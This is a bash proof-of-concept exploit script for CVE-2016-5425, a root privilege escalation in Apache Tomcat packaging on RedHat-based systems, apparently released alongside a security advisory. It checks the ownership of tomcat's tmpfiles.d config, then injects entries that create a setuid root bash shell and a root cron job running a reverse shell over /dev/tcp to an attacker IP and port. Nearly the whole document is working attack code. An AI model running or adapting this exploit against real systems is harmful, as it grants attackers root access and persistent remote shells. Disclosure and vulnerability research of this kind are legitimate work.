#!/bin/bash
# Apache Tomcat packaging on RedHat-based distros - Root Privilege Escalation PoC Exploit
# CVE-2016-5425
#
# Full advisory at:
# http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
#
# Discovered and coded by:
# Dawid Golunski
# http://legalhackers.com
#
# Tested on RedHat, CentOS, OracleLinux, Fedora systems.
#
# For testing purposes only.
#

ATTACKER_IP=127.0.0.1
ATTACKER_PORT=9090

echo -e "\n* Apache Tomcat (RedHat distros) - Root PrivEsc PoC CVE-2016-5425 *"
echo -e  "  Discovered by Dawid Golunski\n"
echo "[+] Checking vulnerability"
stat -c '%U %G' /usr/lib/tmpfiles.d/tomcat.conf | grep tomcat
if [ $? -ne 0 ]; then
	echo "Not vulnerable or tomcat installed under a different user than 'tomcat'"
	exit 1
fi
echo -e "\n[+] Your system is vulnerable!"

echo -e "\n[+] Appending data to /usr/lib/tmpfiles.d/tomcat.conf..."
cat<<_eof_>>/usr/lib/tmpfiles.d/tomcat.conf
C /usr/share/tomcat/rootsh 4770 root root - /bin/bash
z /usr/share/tomcat/rootsh 4770 root root -
F /etc/cron.d/tomcatexploit 0644 root root - "* * * * * root nohup bash -i >/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0<&1 2>&1 & \n\n"
_eof_

echo "[+] /usr/lib/tmpfiles.d/tomcat.conf contains:"
cat /usr/lib/tmpfiles.d/tomcat.conf
echo -e "\n[+] Payload injected! Wait for your root shell...\n"
echo -e "Once '/usr/bin/systemd-tmpfiles --create' gets executed (on reboot by tmpfiles-setup.service, by cron, by another service etc.), 
the rootshell will be created in /usr/share/tomcat/rootsh. 
Additionally, a reverse shell should get executed by crond shortly after and connect to $ATTACKER_IP:$ATTACKER_PORT \n"

